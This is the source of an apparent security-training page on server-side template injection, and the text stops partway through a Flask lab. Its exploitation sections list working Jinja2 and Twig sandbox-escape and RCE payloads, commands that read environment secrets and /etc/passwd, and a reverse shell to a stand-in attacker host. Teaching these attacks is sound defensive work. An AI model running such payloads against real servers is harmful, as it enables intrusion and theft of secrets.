<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master SSTI vulnerabilities - Understanding Server-Side Template Injection attacks and implementing robust defenses. Complete cybersecurity training module.">
  <title>Server-Side Template Injection (SSTI) - Complete Guide | DarkHunter</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/ssti-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>


  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Server-Side Template Injection (SSTI)</h1>
        <p class="page-subtitle">
          Master SSTI vulnerabilities - Learn how attackers inject malicious template code to execute arbitrary
          commands
          on the server. Understand template engine internals and build bulletproof defenses.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is SSTI?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is Server-Side Template Injection (SSTI)?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> Server-Side Template Injection (SSTI) occurs when an attacker injects malicious
          template code into a server-side template engine, causing the server to execute arbitrary code during the
          template rendering process. This vulnerability arises when user input is concatenated directly into
          templates
          without proper sanitization or context-aware escaping.
        </div>

        <p class="text-content">
          Template engines like Twig (PHP), Jinja2 (Python), and ERB (Ruby) are designed to separate presentation from
          logic. However, when developers mistakenly embed raw user input into templates—often using string
          concatenation instead of proper context variables—the template engine interprets user data as executable
          code.
          This creates a direct path from user input to remote code execution (RCE).
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> SSTI is frequently a direct vector to Remote Code Execution (RCE).
          Attackers can read arbitrary files, execute system commands, access environment variables containing
          secrets,
          pivot to internal networks, and completely compromise the server. Unlike XSS which affects clients, SSTI
          executes on the server with full application privileges.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div style="margin: 1rem 0;">
          <span class="severity-badge severity-critical">CVSS 9.8 - Critical</span>
        </div>
        <div class="highlight-box">
          <strong>CVSS v3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector (AV):</strong> Network - Exploitable remotely via HTTP requests</li>
            <li><strong>Attack Complexity (AC):</strong> Low - Simple payload injection in most cases</li>
            <strong>Privileges Required (PR):</strong> None - Often exploitable by unauthenticated users
            <li><strong>User Interaction (UI):</strong> None - Direct server-side execution</li>
            <li><strong>Scope (S):</strong> Changed - Can escape template sandbox to underlying OS</li>
            <li><strong>Impact:</strong> High on Confidentiality, Integrity, and Availability</li>
          </ul>
        </div>

        <h3 class="subsection-title">Common Template Engines Affected</h3>
        <div class="template-engine-grid">
          <div class="engine-card">
            <div class="engine-name">Twig</div>
            <div class="engine-lang">PHP (Symfony)</div>
            <span class="payload-tag">{{7*7}}</span>
            <span class="payload-tag">{{system('id')}}</span>
          </div>
          <div class="engine-card">
            <div class="engine-name">Smarty</div>
            <div class="engine-lang">PHP</div>
            <span class="payload-tag">{php}system('id'){/php}</span>
            <span class="payload-tag">{$system('id')}</span>
          </div>
          <div class="engine-card">
            <div class="engine-name">Jinja2</div>
            <div class="engine-lang">Python (Flask/Django)</div>
            <span class="payload-tag">{{7*7}}</span>
            <span class="payload-tag">{{config.items()}}</span>
          </div>
          <div class="engine-card">
            <div class="engine-name">Mako</div>
            <div class="engine-lang">Python</div>
            <span class="payload-tag">${7*7}</span>
            <span class="payload-tag"><% import os %></span>
          </div>
          <div class="engine-card">
            <div class="engine-name">ERB</div>
            <div class="engine-lang">Ruby (Rails)</div>
            <span class="payload-tag"><%= 7*7 %></span>
            <span class="payload-tag"><% system('id') %></span>
          </div>
          <div class="engine-card">
            <div class="engine-name">Handlebars</div>
            <div class="engine-lang">JavaScript (Node.js)</div>
            <span class="payload-tag>{{this}}</span>
            <span class=" payload-tag">{{#with "s" as |string|}}</span>
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 SSTI Attack Architecture</div>
          <div class="attack-flow" style="margin: 0;">
            <div class="flow-step">
              <div class="flow-icon attack">🎯</div>
              <div class="flow-label">Attacker</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Injects {{7*7}} payload</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon server">📝</div>
              <div class="flow-label">Template Engine</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Parses user input as code
              </p>
            </div>
            <div class="flow-step">
              <div class="flow-icon victim">⚙️</div>
              <div class="flow-label">Server Execution</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Evaluates 7*7 = 49</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon attack">🔓</div>
              <div class="flow-label">Full RCE</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">system('cat /etc/passwd')
              </p>
            </div>
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How SSTI Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">Template Engine Fundamentals</h3>
        <p class="text-content">
          Template engines process template files containing static content and dynamic placeholders. When rendering,
          the engine replaces placeholders with actual data. SSTI occurs when user input becomes part of the template
          syntax itself, rather than just the data context.
        </p>

        <div class="highlight-box">
          <strong>The Critical Distinction:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Safe:</strong> <code>template.render({'name': user_input})</code> → User data is context
              variable</li>
            <li><strong>Vulnerable:</strong> <code>template.parse('Hello ' + user_input)</code> → User data becomes
              template syntax</li>
          </ul>
        </div>

        <h3 class="subsection-title">The Vulnerability Pattern</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Vulnerable Template Construction</span></div>
          <pre><code><span class="code-comment">-- Vulnerable: String concatenation into template</span>
<span class="code-keyword">$template</span> = <span class="code-string">"Hello, "</span> . <span class="code-keyword">$_GET</span>[<span class="code-string">'name'</span>] . <span class="code-string">"!"</span>;
<span class="code-keyword">$twig</span>-><span class="code-function">createTemplate</span>(<span class="code-keyword">$template</span>)-><span class="code-function">render</span>();

<span class="code-comment">-- Attacker input: {{7*7}}</span>
<span class="code-comment">-- Result: Template becomes "Hello, {{7*7}}!"</span>
<span class="code-comment">-- Output: "Hello, 49!"  ← MATH WAS EXECUTED!</span>

<span class="code-comment">-- Attacker input: {{system('id')}}</span>
<span class="code-comment">-- Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
        </div>

        <h3 class="subsection-title">Template Engine Sandbox Escapes</h3>
        <p class="text-content">
          Modern template engines implement sandboxes to restrict dangerous functions. However, attackers chain object
          attributes and methods to escape these restrictions—often called "sandbox escape" or "gadget chains."
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Jinja2 Sandbox Escape (Python)</span></div>
          <pre><code><span class="code-comment">-- Step 1: Access the built-in 'type' object</span>
{{ ''.__class__ }}  <span class="code-comment">→ <class 'str'></span>

<span class="code-comment">-- Step 2: Climb to object base class</span>
{{ ''.__class__.__mro__[1] }}  <span class="code-comment">→ <class 'object'></span>

<span class="code-comment">-- Step 3: Access all subclasses (including dangerous ones)</span>
{{ ''.__class__.__mro__[1].__subclasses__() }}  <span class="code-comment">→ List of all classes</span>

<span class="code-comment">-- Step 4: Find file-reading class (e.g., _io._wrap_close)</span>
{{ ''.__class__.__mro__[1].__subclasses__()[132] }}  <span class="code-comment">→ <class '_io._wrap_close'></span>

<span class="code-comment">-- Step 5: Initialize and execute</span>
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('id') }}

<span class="code-comment">-- Modern shortcut using config</span>
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}</code></pre>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Twig Sandbox Escape (PHP)</span></div>
          <pre><code><span class="code-comment">-- Access global _self variable</span>
{{ _self.env.registerUndefinedFilterCallback("exec") }}

<span class="code-comment">-- Via _context (Twig 1.x)</span>
{{ _context[''].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

<span class="code-comment">-- Using attribute() function to bypass filters</span>
{{ attribute(attribute(attribute(_self, "env"), "filters"), "system")("id")|raw }}

<span class="code-comment">-- Modern Twig 3.x payload</span>
{{ ["id"]|filter("system") }}
{{ ["cat /etc/passwd"]|map("system")|join }}</code></pre>
        </div>

        <h3 class="subsection-title">Object Attribute Chaining</h3>
        <p class="text-content">
          SSTI exploits rely on Python/PHP's introspection capabilities. The <code>__class__</code>,
          <code>__mro__</code>, <code>__subclasses__</code>, and <code>__globals__</code> attributes form a "universal
          key" to access any class or function in the runtime environment.
        </p>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">📝</div>
            <div class="flow-label">String Object</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">''.__class__</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">⬆️</div>
            <div class="flow-label">MRO Chain</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">.__mro__[1]</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">📋</div>
            <div class="flow-label">Subclasses</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">.__subclasses__()</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">🐍</div>
            <div class="flow-label">os.system</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">.__globals__</p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting SSTI</h2>

        <h3 class="subsection-title">Step 1: Identify Template Injection Points</h3>
        <p class="text-content">
          Look for features that reflect user input with template-like syntax modifications—mathematical operations,
          variable interpolation, or logic evaluation.
        </p>

        <div class="highlight-box">
          <strong>Detection Payloads (Polyglots):</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><code>${7*7}</code> → If result is 49, likely Mako/Expression Language</li>
            <li><code>{{7*7}}</code> → If result is 49, likely Twig/Jinja2/Handlebars</li>
            <li><code><%= 7*7 %></code> → If result is 49, likely ERB/ASP</li>
            <li><code>${"z".join("ab")}</code> → If result is "azb", confirmed Jinja2/Twig</li>
            <li><code>{{dump(app)}}</code> → Symfony/Twig debug output</li>
            <li><code>{{7*'7'}}</code> → Jinja2 returns "7777777" (type confusion)</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Burp Suite Detection</span></div>
          <pre><code><span class="code-comment">-- Send to Intruder with these payloads:</span>
{{7*7}}
${7*7}
<%= 7*7 %>
${"z".join("ab")}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all}}

<span class="code-comment">-- Look for:</span>
<span class="code-comment">-- 49 (math executed)</span>
<span class="code-comment">-- 7777777 (string multiplication - Jinja2)</span>
<span class="code-comment">-- Error messages mentioning "Twig", "Jinja", "Template"</span>
<span class="code-comment">-- Debug traces with line numbers from template files</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 2: Identify the Template Engine</h3>
        <p class="text-content">
          Different engines have different syntax and sandbox implementations. Accurate identification is crucial for
          building working exploits.
        </p>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Engine</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Test Payload</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Success Indicator</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Jinja2</td>
              <td style="padding: 0.75rem;"><code>{{7*'7'}}</code></td>
              <td style="padding: 0.75rem;">7777777 (string repeat)</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Twig</td>
              <td style="padding: 0.75rem;"><code>{{7*7}}</code></td>
              <td style="padding: 0.75rem;">49 (math works)</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Smarty</td>
              <td style="padding: 0.75rem;"><code>{if 7*7 eq 49}yes{/if}</code></td>
              <td style="padding: 0.75rem;">"yes" displayed</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Mako</td>
              <td style="padding: 0.75rem;"><code>${7*7}</code></td>
              <td style="padding: 0.75rem;">49</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">ERB</td>
              <td style="padding: 0.75rem;"><code><%= 7*7 %></code></td>
              <td style="padding: 0.75rem;">49</td>
            </tr>
          </table>
        </div>

        <h3 class="subsection-title">Step 3: Build the Exploit Chain</h3>
        <p class="text-content">
          Once the engine is identified, construct sandbox escape payloads to reach RCE. This involves navigating the
          object hierarchy to find dangerous classes.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Jinja2 RCE Construction</span></div>
          <pre><code><span class="code-comment">-- Phase 1: Confirm code execution</span>
{{7*7}}  <span class="code-comment">→ 49</span>

<span class="code-comment">-- Phase 2: Access object internals</span>
{{''.__class__}}  <span class="code-comment">→ <class 'str'></span>

<span class="code-comment">-- Phase 3: Find method to list subclasses</span>
{{''.__class__.__mro__[1].__subclasses__()}}  <span class="code-comment">→ Huge list</span>

<span class="code-comment">-- Phase 4: Locate os._wrap_close or similar</span>
<span class="code-comment">-- Use Burp Intruder to find index:</span>
{{''.__class__.__mro__[1].__subclasses__()[§0§]}}
<span class="code-comment">-- Look for <class 'os._wrap_close'> around index 130-150</span>

<span class="code-comment">-- Phase 5: Execute command</span>
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

<span class="code-comment">-- Alternative: Find warnings.catch_warnings (index varies)</span>
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}</code></pre>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Twig RCE Construction</span></div>
          <pre><code><span class="code-comment">-- Method 1: Using filter() (Twig 2.10+)</span>
{{ ['id'] | filter('system') }}

<span class="code-comment">-- Method 2: Using map() (Twig 2.10+)</span>
{{ ['cat /etc/passwd'] | map('file_get_contents') | join }}

<span class="code-comment">-- Method 3: Using sort() with environment access</span>
{{ ['id'] | sort('system') }}

<span class="code-comment">-- Method 4: Object injection via _self</span>
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("system")("id") }}

<span class="code-comment">-- Method 5: Using attribute() to bypass restrictions</span>
{{ attribute(attribute(_self, "env"), "getFilter")("system")("id") }}</code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Data Exfiltration</h3>
        <p class="text-content">
          Once RCE is achieved, extract sensitive data and establish persistence.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Common Exfiltration Commands</span></div>
          <pre><code><span class="code-comment">-- Read environment variables (secrets, API keys)</span>
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').environ}}

<span class="code-comment">-- Read application config</span>
{{config}}  <span class="code-comment">→ Flask/Django config object</span>

<span class="code-comment">-- List files</span>
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').listdir('.')}}

<span class="code-comment">-- Read arbitrary files</span>
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

<span class="code-comment">-- Reverse shell (base64 encoded to avoid quotes)</span>
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')}}</code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: SSTI Exploitation with Burp Suite</div>
          <div class="diagram-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step SSTI detection → identification → exploitation → RCE]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious SSTI Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Uber Account Takeover via SSTI (2017)</h3>
        <p class="text-content">
          Security researcher Anand Prakash discovered an SSTI vulnerability in Uber's email template system. The
          Java-based template engine (Apache Velocity) processed user-controlled data in email subjects, allowing RCE
          through template injection.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Full account takeover for any Uber user, access to internal APIs, potential access
          to
          rider/driver personal data including trip histories and payment information. Uber paid a $6,000 bounty
          (later
          criticized as too low for the severity).
        </div>

        <h3 class="subsection-title">Case Study 2: Shopify Remote Code Execution (2021)</h3>
        <p class="text-content">
          A vulnerability in Shopify's email marketing feature allowed SSTI through the Liquid template engine.
          Attackers could inject template syntax in campaign names that were processed server-side.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Campaign name injection → Liquid SSTI → Shopify internal API access → Store
          data exfiltration → Potential mass merchant data theft.
        </div>

        <h3 class="subsection-title">Case Study 3: Cisco Prime Infrastructure RCE (2019)</h3>
        <p class="text-content">
          Cisco's network management software used Apache FreeMarker templates that processed user input without
          proper
          sanitization. CVE-2019-15271 allowed unauthenticated attackers to achieve RCE via SSTI.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> CVSS 9.8 Critical. Complete device compromise, network infrastructure access,
          ability
          to pivot to managed devices. Affected enterprise networks globally.
        </div>

        <h3 class="subsection-title">Case Study 4: Tesla Cloud Infrastructure Compromise (2018)</h3>
        <p class="text-content">
          Researchers found an SSTI vulnerability in Tesla's Kubernetes console, which used the Go text/template
          engine.
          The vulnerability allowed access to AWS credentials and takeover of Tesla's cloud infrastructure.
        </p>
        <div class="highlight-box">
          <strong>Discovery:</strong> The team used a simple payload <code>{{7*7}}</code> in a debug console, observed
          the result 49, then built a chain to access the AWS metadata service and extract IAM credentials.
        </div>

        <h3 class="subsection-title">Industry Impact Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">SSTI Attack Vector</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SaaS/Cloud</td>
              <td style="padding: 0.75rem;">Email templates, PDF generators, report builders</td>
              <td style="padding: 0.75rem;">Multi-tenant data breach, cross-account access</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Product description renderers, receipt templates</td>
              <td style="padding: 0.75rem;">Payment data theft, order manipulation</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Fintech</td>
              <td style="padding: 0.75rem;">Statement generators, notification systems</td>
              <td style="padding: 0.75rem;">Financial records, PII, regulatory violations</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Enterprise</td>
              <td style="padding: 0.75rem;">CMS plugins, document management</td>
              <td style="padding: 0.75rem;">Domain compromise, lateral movement</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">IoT/Network</td>
              <td style="padding: 0.75rem;">Device configuration UIs, reporting tools</td>
              <td style="padding: 0.75rem;">Botnet recruitment, network infiltration</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper template construction enables SSTI, then
          implement
          context-aware template rendering with strict sandboxing and input validation.
        </div>

        <h3 class="subsection-title">Lab 1: Basic SSTI in PHP (Twig)</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Concatenating user input directly into template strings.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">require_once</span> <span class="code-string">'vendor/autoload.php'</span>;
<span class="code-keyword">use</span> Twig\Environment;
<span class="code-keyword">use</span> Twig\Loader\ArrayLoader;

<span class="code-comment">// DANGEROUS: User input concatenated into template</span>
<span class="code-keyword">$user_input</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'name'</span>] ?? <span class="code-string">'Guest'</span>;

<span class="code-comment">// VULNERABILITY: Direct string concatenation</span>
<span class="code-keyword">$template_string</span> = <span class="code-string">"Hello, {{ "</span> . <span class="code-keyword">$user_input</span> . <span class="code-string">" }}!"</span>;

<span class="code-keyword">$loader</span> = <span class="code-keyword">new</span> ArrayLoader([<span class="code-string">'template'</span> => <span class="code-keyword">$template_string</span>]);
<span class="code-keyword">$twig</span> = <span class="code-keyword">new</span> Environment(<span class="code-keyword">$loader</span>);

<span class="code-comment">// If user sends: name=7*7, output is "Hello, 49!"</span>
<span class="code-comment">// If user sends: name=_self.env.registerUndefinedFilterCallback("system")</span>
<span class="code-comment">// Full RCE achieved!</span>

<span class="code-keyword">echo</span> <span class="code-keyword">$twig</span>-><span class="code-function">render</span>(<span class="code-string">'template'</span>);
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">require_once</span> <span class="code-string">'vendor/autoload.php'</span>;
<span class="code-keyword">use</span> Twig\Environment;
<span class="code-keyword">use</span> Twig\Loader\ArrayLoader;
<span class="code-keyword">use</span> Twig\Sandbox\SecurityPolicy;
<span class="code-keyword">use</span> Twig\Sandbox\SecurityError;

<span class="code-keyword">class</span> <span class="code-function">SecureTemplateRenderer</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$twig</span>;
    
    <span class="code-keyword">public function</span> <span class="code-function">__construct</span>() {
        <span class="code-comment">// Fixed template - user input NEVER touches template syntax</span>
        <span class="code-keyword">$template_string</span> = <span class="code-string">"Hello, {{ name }}!"</span>;
        
        <span class="code-keyword">$loader</span> = <span class="code-keyword">new</span> ArrayLoader([<span class="code-string">'template'</span> => <span class="code-keyword">$template_string</span>]);
        <span class="code-keyword">$this</span>->twig = <span class="code-keyword">new</span> Environment(<span class="code-keyword">$loader</span>);
        
        <span class="code-comment">// Configure strict sandbox</span>
        <span class="code-keyword">$this</span>-><span class="code-function">configureSandbox</span>();
    }
    
    <span class="code-keyword">private function</span> <span class="code-function">configureSandbox</span>() {
        <span class="code-comment">// Whitelist allowed tags and filters</span>
        <span class="code-keyword">$tags</span> = [<span class="code-string">'if'</span>, <span class="code-string">'for'</span>];
        <span class="code-keyword">$filters</span> = [<span class="code-string">'upper'</span>, <span class="code-string">'lower'</span>, <span class="code-string">'escape'</span>];
        <span class="code-keyword">$methods</span> = [];
        <span class="code-keyword">$properties</span> = [];
        <span class="code-keyword">$functions</span> = [<span class="code-string">'range'</span>];
        
        <span class="code-keyword">$policy</span> = <span class="code-keyword">new</span> SecurityPolicy(<span class="code-keyword">$tags</span>, <span class="code-keyword">$filters</span>, <span class="code-keyword">$methods</span>, <span class="code-keyword">$properties</span>, <span class="code-keyword">$functions</span>);
        <span class="code-keyword">$this</span>->twig-><span class="code-function">addExtension</span>(<span class="code-keyword">new</span> \Twig\Extension\SandboxExtension(<span class="code-keyword">$policy</span>, <span class="code-keyword">true</span>));
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">render</span>(<span class="code-keyword">$user_input</span>) {
        <span class="code-comment">// Strict input validation</span>
        <span class="code-keyword">if</span> (!<span class="code-function">is_string</span>(<span class="code-keyword">$user_input</span>) || <span class="code-function">strlen</span>(<span class="code-keyword">$user_input</span>) > <span class="code-number">100</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \InvalidArgumentException(<span class="code-string">"Invalid input"</span>);
        }
        
        <span class="code-comment">// Remove any template syntax characters</span>
        <span class="code-keyword">$sanitized</span> = <span class="code-function">str_replace</span>(
            [<span class="code-string">'{'</span>, <span class="code-string">'}'</span>, <span class="code-string">'%'</span>, <span class="code-string">'$'</span>, <span class="code-string">'#'</span>],
            <span class="code-string">''</span>,
            <span class="code-keyword">$user_input</span>
        );
        
        <span class="code-comment">// Render with context - input is DATA, not template code</span>
        <span class="code-keyword">return</span> <span class="code-keyword">$this</span>->twig-><span class="code-function">render</span>(<span class="code-string">'template'</span>, [<span class="code-string">'name'</span> => <span class="code-keyword">$sanitized</span>]);
    }
}

<span class="code-comment">// Usage</span>
<span class="code-keyword">$renderer</span> = <span class="code-keyword">new</span> SecureTemplateRenderer();
<span class="code-keyword">echo</span> <span class="code-keyword">$renderer</span>-><span class="code-function">render</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'name'</span>] ?? <span class="code-string">'Guest'</span>);
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Python Flask/Jinja2 SSTI</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Using <code>render_template_string</code> with user input.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Python/Flask</span></div>
          <pre><code><span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, render_template_string

app = Flask(__name__)

<span class="code-keyword">@app.route</span>(<span class="code-string">'/greet'</span>)
